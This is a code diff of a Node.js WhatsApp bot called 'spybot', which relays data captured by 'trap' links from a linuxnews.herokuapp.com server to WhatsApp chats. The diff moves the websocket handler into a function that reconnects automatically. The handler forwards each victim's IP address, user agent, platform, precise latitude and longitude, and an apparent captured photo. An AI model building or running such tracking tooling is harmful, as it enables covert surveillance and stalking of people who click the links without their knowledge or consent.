@@ -2,7 +2,6 @@ const axios = require("axios")
 const {WAConnection, MessageType} = require('@adiwajshing/baileys');
 const fs = require('fs');
 const ws = require('ws');
-const websock = new ws('ws://linuxnews.herokuapp.com/ws')
 const spybot = new WAConnection();
 const Session = axios.create({ baseURL: 'https://linuxnews.herokuapp.com' });
 const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
@@ -11,6 +10,39 @@ const linuxnews = {
     password:'',
     token:''
 }
+function websocket(){
+    var websock = new ws('ws://linuxnews.herokuapp.com/ws')
+    websock.on('message', async function incoming(data){
+        let parser = JSON.parse(data);
+        console.log(JSON.stringify(parser, null, '\t'))
+        if('msg' in parser) {
+        } else if ("IP" in parser){
+            var message=`IP : ${parser.IP}
+    User-Agent: ${parser['User-Agent']}      
+    Akurasi : ${parser.GeoAccuracy}
+    URL : ${parser.trap_url}
+    Dikunjungi : ${parser.visited} kali
+    Platform : ${parser.Platform}
+    timestamp : ${new Date(parseInt(parser['GeoTimestamp'])).toUTCString()}
+            `.trim()
+            if("img" in parser){
+                await spybot.sendMessage(parser.trap_name, Buffer.from(parser.img.slice(31), 'base64'), image, {caption:message})
+            }else{
+                await spybot.sendMessage(parser.trap_name, message, text)
+            }
+            await spybot.sendMessage(parser.trap_name, {degreesLatitude:parseFloat(parser.GeoLatitude), degreesLongitude:parseFloat(parser.GeoLongitude)}, location)
+        } else {
+        }
+    })
+    websock.on('close', (e)=>{
+        console.log("Websocket Disconnect")
+        websocket()
+    })
+    websock.on('open', function open(){
+        websock.send(`{"email":"${linuxnews.email}", "password":"${linuxnews.password}"}`);
+    })
+}
+websocket()
 async function prettyTrap(chat_id){
     st=""
     await get_url().then(x=>{
@@ -41,31 +73,6 @@ async function delTrap(id, name){
         return false
     })
 }
-websock.on('message', async function incoming(data){
-    let parser = JSON.parse(data);
-    console.log(JSON.stringify(parser, null, '\t'))
-    if('msg' in parser) {
-    } else if ("IP" in parser){
-        var message=`IP : ${parser.IP}
-User-Agent: ${parser['User-Agent']}      
-Akurasi : ${parser.GeoAccuracy}
-URL : ${parser.trap_url}
-Dikunjungi : ${parser.visited} kali
-Platform : ${parser.Platform}
-timestamp : ${new Date(parseInt(parser['GeoTimestamp'])).toUTCString()}
-        `.trim()
-        if("img" in parser){
-            await spybot.sendMessage(parser.trap_name, Buffer.from(parser.img.slice(31), 'base64'), image, {caption:message})
-        }else{
-            await spybot.sendMessage(parser.trap_name, message, text)
-        }
-        await spybot.sendMessage(parser.trap_name, {degreesLatitude:parseFloat(parser.GeoLatitude), degreesLongitude:parseFloat(parser.GeoLongitude)}, location)
-    } else {
-    }
-})
-websock.on('open', function open(){
-    websock.send(`{"email":"${linuxnews.email}", "password":"${linuxnews.password}"}`);
-})
 async function spybotReplier(message, content){
     var from    = message.key.remoteJid;
     var cmd     = content.split(' ')
